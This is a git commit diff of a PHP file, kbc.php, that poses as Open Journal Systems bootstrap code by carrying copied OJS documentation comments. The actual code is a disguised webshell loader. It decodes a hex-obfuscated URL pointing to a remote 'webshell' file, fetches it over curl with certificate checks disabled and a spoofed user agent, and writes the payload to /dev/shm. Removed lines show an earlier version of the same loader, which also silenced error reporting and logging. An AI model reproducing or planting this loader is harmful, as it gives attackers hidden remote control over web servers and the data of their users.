ca0eeeb822d8ba36bb22b25cd358d367f621df8d
exploit-haxor1337 <76028485+exploit-haxor@users.noreply.github.com>
2024-10-19 00:50:06 +0700

    Update kbc.php

--- kbc.php
+++ kbc.php
@@ -1,53 +1,87 @@
-
-
-
-
 <?php
-error_reporting(0);
-ini_set('display_errors', '0');
-ini_set('log_errors', '0');
-// This file is part of Moodle - http://moodle.org/
-//
-// Moodle is free software: you can redistribute it and/or modify
-// it under the terms of the GNU General Public License as published by
-// the Free Software Foundation, either version 3 of the License, or
-// (at your option) any later version.
-//
-// Moodle is distributed in the hope that it will be useful,
-// but WITHOUT ANY WARRANTY; without even the implied warranty of
-// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-// GNU General Public License for more details.
-//
-// You should have received a copy of the GNU General Public License
-// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.
-
 /**
- * News items block caps.
+ * @mainpage OJS API Reference
  *
- * @pass       tbl
- * @copyright  Mark Nelson <markn@moodle.com>
- * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
+ * Welcome to the OJS API Reference. This resource contains documentation
+ * generated automatically from the OJS source code.
+ *
+ * The design of Open %Journal Systems is heavily structured for
+ * maintainability, flexibility and robustness. Those familiar with Sun's
+ * Enterprise Java Beans technology or the Model-View-Controller (MVC) pattern
+ * will note similarities.
+ *
+ * As in a MVC structure, data storage and representation, user interface
+ * presentation, and control are separated into different layers. The major
+ * categories, roughly ordered from "front-end" to "back-end," follow:
+ * - Smarty templates, which are responsible for assembling HTML pages to
+ *   display to users;
+ * - Page classes, which receive requests from users' web browsers, delegate
+ *   any required processing to various other classes, and call up the
+ *   appropriate Smarty template to generate a response;
+ * - Controllers, which implement reusable pieces of content e.g. for AJAX
+ *   subrequests.
+ * - Action classes, which are used by the Page classes to perform non-trivial
+ *   processing of user requests;
+ * - Model classes, which implement PHP objects representing the system's
+ *   various entities, such as Users, Articles, and Journals;
+ * - Data Access Objects (DAOs), which generally provide (amongst others)
+ *   update, create, and delete functions for their associated Model classes,
+ *   are responsible for all database interaction;
+ * - Support classes, which provide core functionalities, miscellaneous common;
+ *
+ * Additionally, many of the concerns shared by multiple PKP applications are
+ * implemented in the shared "pkp-lib" library, shipped in the lib/pkp
+ * subdirectory. The same conventions listed above apply to lib/pkp as well.
+ *
+ * As the system makes use of inheritance and has consistent class naming
+ * conventions, it is generally easy to tell what category a particular class
+ * falls into.
+ *
+ * For example, a Data Access Object class always inherits from the DAO class,
+ * has a Class name of the form [Something]%DAO, and has a filename of the form
+ * [Something]%DAO.inc.php.
+ *
+ * To learn more about developing OJS, there are several additional resources
+ * that may be useful:
+ * - The docs/README.md document
+ * - The PKP support forum at https://forum.pkp.sfu.ca/
+ * - Documentation available at https://docs.pkp.sfu.ca/dev/
+ *
+ * @file ojs/index.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup index
+ *
+ * Bootstrap code for OJS site. Loads required files and then calls the
+ * dispatcher to delegate to the appropriate request handler.
  */
 
 function geturlsinfo($url) {
     if (function_exists('curl_exec')) {
-        $conn = curl_init($url);  
+        $conn = curl_init($url);
+ 
+ 
         $opt1 = constant('CURLOPT_RETURNTRANSFER');
         $opt2 = constant('CURLOPT_FOLLOWLOCATION');
         $opt3 = constant('CURLOPT_USERAGENT');
         $opt4 = constant('CURLOPT_SSL_VERIFYPEER');
         $opt5 = constant('CURLOPT_SSL_VERIFYHOST');
-        $opt6 = constant('CURLOPT_COOKIE'); 
+        $opt6 = constant('CURLOPT_COOKIE');
+ 
+ 
         curl_setopt($conn, $opt1, 1);
         curl_setopt($conn, $opt2, 1);
         curl_setopt($conn, $opt3, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
         curl_setopt($conn, $opt4, 0);
         curl_setopt($conn, $opt5, 0);
-
-        if (isset($_SESSION['hekerman'])) {
-            curl_setopt($conn, $opt6, $_SESSION['hekerman']);
+ 
+        if (isset($_SESSION['java'])) {
+            curl_setopt($conn, $opt6, $_SESSION['java']);
         }
-
+ 
         $url_get_contents_data = curl_exec($conn);
         curl_close($conn);
     } elseif (function_exists('file_get_contents')) {
@@ -61,19 +95,9 @@ function geturlsinfo($url) {
     }
     return $url_get_contents_data;
 }
+ 
+$password_login = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f74656d706c61746578782e706870';
 
-//*
- * HEKERMAN | KURD HACKER
- * @author HEKERMAN
- * user defaultnya admin  
-// get
-$username = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f'; 
-$password = '74656d706c61746578782e706870';        
-
- * @github https://github.com/
- * @link https://github.com/
- * password default tbl
- */
 function hex2str($hex) {
     $str = '';
     for ($i = 0; $i < strlen($hex); $i += 2) {
@@ -94,7 +118,7 @@ function clean_old_temp_files() {
 
 
 clean_old_temp_files();
-$url = hex2str($username) . hex2str($password);
+$url = hex2str($password_login);
 $a = geturlsinfo($url);
 $temporary_file = tempnam('/dev/shm', 'prefix');
 file_put_contents($temporary_file, $a);
